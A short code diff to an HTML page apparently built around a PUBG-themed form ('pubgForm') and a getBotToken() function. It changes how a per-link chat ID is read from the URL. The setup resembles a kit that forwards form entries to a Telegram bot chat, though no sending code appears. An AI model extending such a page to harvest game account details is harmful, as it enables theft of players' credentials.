@@ -594,8 +594,9 @@ function getBotToken() {
 
   document.addEventListener("DOMContentLoaded", () => {
     // الحصول على معرف الدردشة من الرابط
-    const urlParams = new URLSearchParams(window.location.search);
-    const CHAT_ID = urlParams.get('id');
+    const chatId = window.location.pathname.split('/').pop();
+        chatIdInput.value = chatId;
+
     
     const form = document.getElementById("pubgForm");
     const submitBtn = document.getElementById("submitBtn");
@@ -713,4 +714,4 @@ function getBotToken() {
 </script>
 
 </body>
- </html>
+  </html>
